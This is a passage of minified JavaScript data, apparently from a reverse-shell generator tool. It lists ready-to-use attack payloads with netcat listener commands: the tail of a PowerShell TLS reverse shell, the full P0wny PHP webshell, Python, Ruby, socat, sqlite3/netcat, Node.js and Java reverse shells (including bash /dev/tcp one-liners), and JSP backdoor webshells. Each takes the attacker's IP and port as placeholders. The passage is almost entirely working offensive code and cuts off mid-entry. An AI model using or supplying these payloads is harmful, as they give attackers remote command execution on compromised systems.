[Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-3-base64",name:"PowerShell #3 (Base64)",category:"Reverse",language:"PowerShell",platform:"Both",command:"PowerShell #3 (Base64)",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-5-stderr-support-base64",name:"PowerShell #5 (stderr support) (Base64)",category:"Reverse",language:"PowerShell",platform:"Both",command:"PowerShell #5 (stderr support) (Base64)",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-p0wny-shell-webshell",name:"P0wny Shell (Webshell)",category:"Reverse",language:"PowerShell",platform:"Both",command:`<?php\r
\r
$SHELL_CONFIG = array(\r
    'username' => 'p0wny',\r
    'hostname' => 'shell',\r
);\r
\r
function expandPath($path) {\r
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {\r
        exec("echo $match[1]", $stdout);\r
        return $stdout[0] . $match[2];\r
    }\r
    return $path;\r
}\r
\r
function allFunctionExist($list = array()) {\r
    foreach ($list as $entry) {\r
        if (!function_exists($entry)) {\r
            return false;\r
        }\r
    }\r
    return true;\r
}\r
\r
function executeCommand($cmd) {\r
    $output = '';\r
    if (function_exists('exec')) {\r
        exec($cmd, $output);\r
        $output = implode("\\n", $output);\r
    } else if (function_exists('shell_exec')) {\r
        $output = shell_exec($cmd);\r
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r
        ob_start();\r
        system($cmd);\r
        $output = ob_get_contents();\r
        ob_end_clean();\r
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r
        ob_start();\r
        passthru($cmd);\r
        $output = ob_get_contents();\r
        ob_end_clean();\r
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\r
        $handle = popen($cmd, 'r');\r
        while (!feof($handle)) {\r
            $output .= fread($handle, 4096);\r
        }\r
        pclose($handle);\r
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\r
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\r
        $output = stream_get_contents($pipes[1]);\r
        proc_close($handle);\r
    }\r
    return $output;\r
}\r
\r
function isRunningWindows() {\r
    return stripos(PHP_OS, "WIN") === 0;\r
}\r
\r
function featureShell($cmd, $cwd) {\r
    $stdout = "";\r
\r
    if (preg_match("/^\\s*cd\\s*(2>&1)?$/", $cmd)) {\r
        chdir(expandPath("~"));\r
    } elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/", $cmd)) {\r
        chdir($cwd);\r
        preg_match("/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);\r
        chdir(expandPath($match[1]));\r
    } elseif (preg_match("/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/", $cmd)) {\r
        chdir($cwd);\r
        preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);\r
        return featureDownload($match[1]);\r
    } else {\r
        chdir($cwd);\r
        $stdout = executeCommand($cmd);\r
    }\r
\r
    return array(\r
        "stdout" => base64_encode($stdout),\r
        "cwd" => base64_encode(getcwd())\r
    );\r
}\r
\r
function featurePwd() {\r
    return array("cwd" => base64_encode(getcwd()));\r
}\r
\r
function featureHint($fileName, $cwd, $type) {\r
    chdir($cwd);\r
    if ($type == 'cmd') {\r
        $cmd = "compgen -c $fileName";\r
    } else {\r
        $cmd = "compgen -f $fileName";\r
    }\r
    $cmd = "/bin/bash -c \\"$cmd\\"";\r
    $files = explode("\\n", shell_exec($cmd));\r
    foreach ($files as &$filename) {\r
        $filename = base64_encode($filename);\r
    }\r
    return array(\r
        'files' => $files,\r
    );\r
}\r
\r
function featureDownload($filePath) {\r
    $file = @file_get_contents($filePath);\r
    if ($file === FALSE) {\r
        return array(\r
            'stdout' => base64_encode('File not found / no read permission.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    } else {\r
        return array(\r
            'name' => base64_encode(basename($filePath)),\r
            'file' => base64_encode($file)\r
        );\r
    }\r
}\r
\r
function featureUpload($path, $file, $cwd) {\r
    chdir($cwd);\r
    $f = @fopen($path, 'wb');\r
    if ($f === FALSE) {\r
        return array(\r
            'stdout' => base64_encode('Invalid path / no write permission.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    } else {\r
        fwrite($f, base64_decode($file));\r
        fclose($f);\r
        return array(\r
            'stdout' => base64_encode('Done.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    }\r
}\r
\r
function initShellConfig() {\r
    global $SHELL_CONFIG;\r
\r
    if (isRunningWindows()) {\r
        $username = getenv('USERNAME');\r
        if ($username !== false) {\r
            $SHELL_CONFIG['username'] = $username;\r
        }\r
    } else {\r
        $pwuid = posix_getpwuid(posix_geteuid());\r
        if ($pwuid !== false) {\r
            $SHELL_CONFIG['username'] = $pwuid['name'];\r
        }\r
    }\r
\r
    $hostname = gethostname();\r
    if ($hostname !== false) {\r
        $SHELL_CONFIG['hostname'] = $hostname;\r
    }\r
}\r
\r
if (isset($_GET["feature"])) {\r
\r
    $response = NULL;\r
\r
    switch ($_GET["feature"]) {\r
        case "shell":\r
            $cmd = $_POST['cmd'];\r
            if (!preg_match('/2>/', $cmd)) {\r
                $cmd .= ' 2>&1';\r
            }\r
            $response = featureShell($cmd, $_POST["cwd"]);\r
            break;\r
        case "pwd":\r
            $response = featurePwd();\r
            break;\r
        case "hint":\r
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\r
            break;\r
        case 'upload':\r
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\r
    }\r
\r
    header("Content-Type: application/json");\r
    echo json_encode($response);\r
    die();\r
} else {\r
    initShellConfig();\r
}\r
\r
?><!DOCTYPE html>\r
\r
<html>\r
\r
    <head>\r
        <meta charset="UTF-8" />\r
        <title>p0wny@shell:~#</title>\r
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />\r
        <style>\r
            html, body {\r
                margin: 0;\r
                padding: 0;\r
                background: #333;\r
                color: #eee;\r
                font-family: monospace;\r
                width: 100vw;\r
                height: 100vh;\r
                overflow: hidden;\r
            }\r
\r
            *::-webkit-scrollbar-track {\r
                border-radius: 8px;\r
                background-color: #353535;\r
            }\r
\r
            *::-webkit-scrollbar {\r
                width: 8px;\r
                height: 8px;\r
            }\r
\r
            *::-webkit-scrollbar-thumb {\r
                border-radius: 8px;\r
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\r
                background-color: #bcbcbc;\r
            }\r
\r
            #shell {\r
                background: #222;\r
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\r
                font-size: 10pt;\r
                display: flex;\r
                flex-direction: column;\r
                align-items: stretch;\r
                max-width: calc(100vw - 2 * var(--shell-margin));\r
                max-height: calc(100vh - 2 * var(--shell-margin));\r
                resize: both;\r
                overflow: hidden;\r
                width: 100%;\r
                height: 100%;\r
                margin: var(--shell-margin) auto;\r
            }\r
\r
            #shell-content {\r
                overflow: auto;\r
                padding: 5px;\r
                white-space: pre-wrap;\r
                flex-grow: 1;\r
            }\r
\r
            #shell-logo {\r
                font-weight: bold;\r
                color: #FF4180;\r
                text-align: center;\r
            }\r
\r
            :root {\r
                --shell-margin: 25px;\r
            }\r
\r
            @media (min-width: 1200px) {\r
                :root {\r
                    --shell-margin: 50px !important;\r
                }\r
            }\r
\r
            @media (max-width: 991px),\r
                   (max-height: 600px) {\r
                #shell-logo {\r
                    font-size: 6px;\r
                    margin: -25px 0;\r
                }\r
                :root {\r
                    --shell-margin: 0 !important;\r
                }\r
                #shell {\r
                    resize: none;\r
                }\r
            }\r
\r
            @media (max-width: 767px) {\r
                #shell-input {\r
                    flex-direction: column;\r
                }\r
            }\r
\r
            @media (max-width: 320px) {\r
                #shell-logo {\r
                    font-size: 5px;\r
                }\r
            }\r
\r
            .shell-prompt {\r
                font-weight: bold;\r
                color: #75DF0B;\r
            }\r
\r
            .shell-prompt > span {\r
                color: #1BC9E7;\r
            }\r
\r
            #shell-input {\r
                display: flex;\r
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\r
                border-top: rgba(255, 255, 255, .05) solid 1px;\r
                padding: 10px 0;\r
            }\r
\r
            #shell-input > label {\r
                flex-grow: 0;\r
                display: block;\r
                padding: 0 5px;\r
                height: 30px;\r
                line-height: 30px;\r
            }\r
\r
            #shell-input #shell-cmd {\r
                height: 30px;\r
                line-height: 30px;\r
                border: none;\r
                background: transparent;\r
                color: #eee;\r
                font-family: monospace;\r
                font-size: 10pt;\r
                width: 100%;\r
                align-self: center;\r
                box-sizing: border-box;\r
            }\r
\r
            #shell-input div {\r
                flex-grow: 1;\r
                align-items: stretch;\r
            }\r
\r
            #shell-input input {\r
                outline: none;\r
            }\r
        </style>\r
\r
        <script>\r
            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\r
            var CWD = null;\r
            var commandHistory = [];\r
            var historyPosition = 0;\r
            var eShellCmdInput = null;\r
            var eShellContent = null;\r
\r
            function _insertCommand(command) {\r
                eShellContent.innerHTML += "\\n\\n";\r
                eShellContent.innerHTML += '<span class=\\"shell-prompt\\">' + genPrompt(CWD) + '</span> ';\r
                eShellContent.innerHTML += escapeHtml(command);\r
                eShellContent.innerHTML += "\\n";\r
                eShellContent.scrollTop = eShellContent.scrollHeight;\r
            }\r
\r
            function _insertStdout(stdout) {\r
                eShellContent.innerHTML += escapeHtml(stdout);\r
                eShellContent.scrollTop = eShellContent.scrollHeight;\r
            }\r
\r
            function _defer(callback) {\r
                setTimeout(callback, 0);\r
            }\r
\r
            function featureShell(command) {\r
\r
                _insertCommand(command);\r
                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\r
                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\r
                } else if (/^\\s*clear\\s*$/.test(command)) {\r
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\r
                    eShellContent.innerHTML = '';\r
                } else {\r
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {\r
                        if (response.hasOwnProperty('file')) {\r
                            featureDownload(atob(response.name), response.file)\r
                        } else {\r
                            _insertStdout(atob(response.stdout));\r
                            updateCwd(atob(response.cwd));\r
                        }\r
                    });\r
                }\r
            }\r
\r
            function featureHint() {\r
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\r
\r
                function _requestCallback(data) {\r
                    if (data.files.length <= 1) return;  // no completion\r
                    data.files = data.files.map(function(file){\r
                        return atob(file);\r
                    });\r
                    if (data.files.length === 2) {\r
                        if (type === 'cmd') {\r
                            eShellCmdInput.value = data.files[0];\r
                        } else {\r
                            var currentValue = eShellCmdInput.value;\r
                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\r
                        }\r
                    } else {\r
                        _insertCommand(eShellCmdInput.value);\r
                        _insertStdout(data.files.join("\\n"));\r
                    }\r
                }\r
\r
                var currentCmd = eShellCmdInput.value.split(" ");\r
                var type = (currentCmd.length === 1) ? "cmd" : "file";\r
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\r
\r
                makeRequest(\r
                    "?feature=hint",\r
                    {\r
                        filename: fileName,\r
                        cwd: CWD,\r
                        type: type\r
                    },\r
                    _requestCallback\r
                );\r
\r
            }\r
\r
            function featureDownload(name, file) {\r
                var element = document.createElement('a');\r
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\r
                element.setAttribute('download', name);\r
                element.style.display = 'none';\r
                document.body.appendChild(element);\r
                element.click();\r
                document.body.removeChild(element);\r
                _insertStdout('Done.');\r
            }\r
\r
            function featureUpload(path) {\r
                var element = document.createElement('input');\r
                element.setAttribute('type', 'file');\r
                element.style.display = 'none';\r
                document.body.appendChild(element);\r
                element.addEventListener('change', function () {\r
                    var promise = getBase64(element.files[0]);\r
                    promise.then(function (file) {\r
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\r
                            _insertStdout(atob(response.stdout));\r
                            updateCwd(atob(response.cwd));\r
                        });\r
                    }, function () {\r
                        _insertStdout('An unknown client-side error occurred.');\r
                    });\r
                });\r
                element.click();\r
                document.body.removeChild(element);\r
            }\r
\r
            function getBase64(file, onLoadCallback) {\r
                return new Promise(function(resolve, reject) {\r
                    var reader = new FileReader();\r
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\r
                    reader.onerror = reject;\r
                    reader.readAsDataURL(file);\r
                });\r
            }\r
\r
            function genPrompt(cwd) {\r
                cwd = cwd || "~";\r
                var shortCwd = cwd;\r
                if (cwd.split("/").length > 3) {\r
                    var splittedCwd = cwd.split("/");\r
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];\r
                }\r
                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\\"" + cwd + "\\">" + shortCwd + "</span>#";\r
            }\r
\r
            function updateCwd(cwd) {\r
                if (cwd) {\r
                    CWD = cwd;\r
                    _updatePrompt();\r
                    return;\r
                }\r
                makeRequest("?feature=pwd", {}, function(response) {\r
                    CWD = atob(response.cwd);\r
                    _updatePrompt();\r
                });\r
\r
            }\r
\r
            function escapeHtml(string) {\r
                return string\r
                    .replace(/&/g, "&amp;")\r
                    .replace(/</g, "&lt;")\r
                    .replace(/>/g, "&gt;");\r
            }\r
\r
            function _updatePrompt() {\r
                var eShellPrompt = document.getElementById("shell-prompt");\r
                eShellPrompt.innerHTML = genPrompt(CWD);\r
            }\r
\r
            function _onShellCmdKeyDown(event) {\r
                switch (event.key) {\r
                    case "Enter":\r
                        featureShell(eShellCmdInput.value);\r
                        insertToHistory(eShellCmdInput.value);\r
                        eShellCmdInput.value = "";\r
                        break;\r
                    case "ArrowUp":\r
                        if (historyPosition > 0) {\r
                            historyPosition--;\r
                            eShellCmdInput.blur();\r
                            eShellCmdInput.value = commandHistory[historyPosition];\r
                            _defer(function() {\r
                                eShellCmdInput.focus();\r
                            });\r
                        }\r
                        break;\r
                    case "ArrowDown":\r
                        if (historyPosition >= commandHistory.length) {\r
                            break;\r
                        }\r
                        historyPosition++;\r
                        if (historyPosition === commandHistory.length) {\r
                            eShellCmdInput.value = "";\r
                        } else {\r
                            eShellCmdInput.blur();\r
                            eShellCmdInput.focus();\r
                            eShellCmdInput.value = commandHistory[historyPosition];\r
                        }\r
                        break;\r
                    case 'Tab':\r
                        event.preventDefault();\r
                        featureHint();\r
                        break;\r
                }\r
            }\r
\r
            function insertToHistory(cmd) {\r
                commandHistory.push(cmd);\r
                historyPosition = commandHistory.length;\r
            }\r
\r
            function makeRequest(url, params, callback) {\r
                function getQueryString() {\r
                    var a = [];\r
                    for (var key in params) {\r
                        if (params.hasOwnProperty(key)) {\r
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));\r
                        }\r
                    }\r
                    return a.join("&");\r
                }\r
                var xhr = new XMLHttpRequest();\r
                xhr.open("POST", url, true);\r
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\r
                xhr.onreadystatechange = function() {\r
                    if (xhr.readyState === 4 && xhr.status === 200) {\r
                        try {\r
                            var responseJson = JSON.parse(xhr.responseText);\r
                            callback(responseJson);\r
                        } catch (error) {\r
                            alert("Error while parsing response: " + error);\r
                        }\r
                    }\r
                };\r
                xhr.send(getQueryString());\r
            }\r
\r
            document.onclick = function(event) {\r
                event = event || window.event;\r
                var selection = window.getSelection();\r
                var target = event.target || event.srcElement;\r
\r
                if (target.tagName === "SELECT") {\r
                    return;\r
                }\r
\r
                if (!selection.toString()) {\r
                    eShellCmdInput.focus();\r
                }\r
            };\r
\r
            window.onload = function() {\r
                eShellCmdInput = document.getElementById("shell-cmd");\r
                eShellContent = document.getElementById("shell-content");\r
                updateCwd();\r
                eShellCmdInput.focus();\r
            };\r
        <\/script>\r
    </head>\r
\r
    <body>\r
        <div id="shell">\r
            <pre id="shell-content">\r
                <div id="shell-logo">\r
        ___                         ____      _          _ _        _  _   <span></span>\r
 _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\r
| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _\` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\r
| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\r
| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\r
|_|                         |___/  \\____/                                  <span></span>\r
                </div>\r
            </pre>\r
            <div id="shell-input">\r
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>\r
                <div>\r
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>\r
                </div>\r
            </div>\r
        </div>\r
    </body>\r
\r
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!0},{id:"rev-python-1",name:"Python #1",category:"Reverse",language:"Python",platform:"Linux",command:`export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python-2",name:"Python #2",category:"Reverse",language:"Python",platform:"Linux",command:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-1",name:"Python3 #1",category:"Reverse",language:"Python",platform:"Linux",command:`export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-2",name:"Python3 #2",category:"Reverse",language:"Python",platform:"Linux",command:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-windows",name:"Python3 Windows",category:"Reverse",language:"Python",platform:"Windows",command:`import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))

p=subprocess.Popen(["{shell}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!0},{id:"rev-python3-shortest",name:"Python3 shortest",category:"Reverse",language:"Python",platform:"Linux",command:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-ruby-1",name:"Ruby #1",category:"Reverse",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`,listener:"nc -lvnp {port}",notes:"",extension:".rb",isFullScript:!1},{id:"rev-ruby-no-sh",name:"Ruby no sh",category:"Reverse",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-socat-1",name:"socat #1",category:"Reverse",language:"Socat",platform:"Linux",command:"socat TCP:{ip}:{port} EXEC:{shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-socat-2-tty",name:"socat #2 (TTY)",category:"Reverse",language:"Socat",platform:"Linux",command:"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-sqlite3-nc-mkfifo",name:"sqlite3 nc mkfifo",category:"Reverse",language:"Netcat",platform:"Linux",command:"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-node-js",name:"node.js",category:"Reverse",language:"NodeJS",platform:"Linux",command:"require('child_process').exec('nc -e {shell} {ip} {port}')",listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!1},{id:"rev-node-js-2",name:"node.js #2",category:"Reverse",language:"NodeJS",platform:"Both",command:`(function(){\r
    var net = require("net"),\r
        cp = require("child_process"),\r
        sh = cp.spawn("{shell}", []);\r
    var client = new net.Socket();\r
    client.connect({port}, "{ip}", function(){\r
        client.pipe(sh.stdin);\r
        sh.stdout.pipe(client);\r
        sh.stderr.pipe(client);\r
    });\r
    return /a/; // Prevents the Node.js application from crashing\r
})();`,listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!0},{id:"rev-java-1",name:"Java #1",category:"Reverse",language:"Java",platform:"Linux",command:`public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-2",name:"Java #2",category:"Reverse",language:"Java",platform:"Linux",command:`public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-3",name:"Java #3",category:"Reverse",language:"Java",platform:"Both",command:`import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "{ip}";
        int port = {port};
        String cmd = "{shell}";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-web",name:"Java Web",category:"Reverse",language:"Java",platform:"Both",command:`<%@\r
page import="java.lang.*, java.util.*, java.io.*, java.net.*"\r
% >\r
<%!\r
static class StreamConnector extends Thread\r
{\r
        InputStream is;\r
        OutputStream os;\r
        StreamConnector(InputStream is, OutputStream os)\r
        {\r
                this.is = is;\r
                this.os = os;\r
        }\r
        public void run()\r
        {\r
                BufferedReader isr = null;\r
                BufferedWriter osw = null;\r
                try\r
                {\r
                        isr = new BufferedReader(new InputStreamReader(is));\r
                        osw = new BufferedWriter(new OutputStreamWriter(os));\r
                        char buffer[] = new char[8192];\r
                        int lenRead;\r
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r
                        {\r
                                osw.write(buffer, 0, lenRead);\r
                                osw.flush();\r
                        }\r
                }\r
                catch (Exception ioe)\r
                try\r
                {\r
                        if(isr != null) isr.close();\r
                        if(osw != null) osw.close();\r
                }\r
                catch (Exception ioe)\r
        }\r
}\r
%>\r
\r
<h1>JSP Backdoor Reverse Shell</h1>\r
\r
<form method="post">\r
IP Address\r
<input type="text" name="ipaddress" size=30>\r
Port\r
<input type="text" name="port" size=10>\r
<input type="submit" name="Connect" value="Connect">\r
</form>\r
<p>\r
<hr>\r
\r
<%\r
String ipAddress = request.getParameter("ipaddress");\r
String ipPort = request.getParameter("port");\r
if(ipAddress != null && ipPort != null)\r
{\r
        Socket sock = null;\r
        try\r
        {\r
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r
                Runtime rt = Runtime.getRuntime();\r
                Process proc = rt.exec("cmd.exe");\r
                StreamConnector outputConnector =\r
                        new StreamConnector(proc.getInputStream(),\r
                                          sock.getOutputStream());\r
                StreamConnector inputConnector =\r
                        new StreamConnector(sock.getInputStream(),\r
                                          proc.getOutputStream());\r
                outputConnector.start();\r
                inputConnector.start();\r
        }\r
        catch(Exception e) \r
}\r
%>`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-two-way",name:"Java Two Way",category:"Reverse",language:"Java",platform:"Both",command:`<%\r
    /*\r
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing \r
     * the command specified in the HTML form). This is to avoid to keep it simple.\r
     */\r
%>\r
\r
<%@page import="java.lang.*"%>\r
<%@page import="java.io.*"%>\r
<%@page import="java.net.*"%>\r
<%@page import="java.util.*"%>\r
\r
<html>\r
<head>\r
    <title>jrshell</title>\r
</head>\r
<body>\r
<form METHOD="POST" NAME="myform" ACTION="">\r
    <input TYPE="text" NAME="shell">\r
    <input TYPE="submit" VALUE="Send">\r
</form>\r
<pre>\r
<%\r
    // Define the OS\r
    String shellPath = null;\r
    try\r
    {\r
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {\r
            shellPath = new String("/bin/sh");\r
        } else {\r
            shellPath = new String("cmd.exe");\r
        }\r
    } catch( Exception e ){}\r
    // INNER HTML PART\r
    if (request.getParameter("shell") != null) {\r
        out.println("Command: " + request.getParameter("shell") + "\\n<BR>");\r
        Process p;\r
        if (shellPath.equals("cmd.exe"))\r
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));\r
        else\r
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));\r
        OutputStream os = p.getOutputStream();\r
        InputStream in = p.getInputStream();\r
        DataInputStream dis = new DataInputStream(in);\r
        String disr = dis.readLine();\r
        while ( disr != null ) {\r
            out.println(disr);\r
            disr = dis.readLine();\r
        }\r
    }\r
    // TCP PORT PART\r
    class StreamConnector extends Thread\r
    {\r
        InputStream wz;\r
        OutputStream yr;\r
        StreamConnector( InputStream wz, OutputStream yr ) {\r
            this.wz = wz;\r
            this.yr = yr;\r
        }\r
        public void run()\r
        {\r
            BufferedReader r  = null;\r
            BufferedWriter w = null;\r
            try\r
            {\r
                r  = new BufferedReader(new InputStreamReader(wz));\r
                w = new BufferedWriter(new OutputStreamWriter(yr));\r
                char buffer[] = new char[8192];\r
                int length;\r
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r
                {\r
                    w.write( buffer, 0, length );\r
                    w.flush();\r
                }\r
            } catch( Exception e ){}\r
            try\r
            {\r
                if( r != null )\r
                    r.close();\r
                if( w != null )\r
                    w.close();\r
            } catch( Exception e ){}\r
        }\r
    }\r
 \r
    try {\r
        Socket socket = new Socket( "{ip}", {port} ); // Replace with wanted ip and port\r
        Process process = Runtime.getRuntime().exec( shellPath );\r
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r
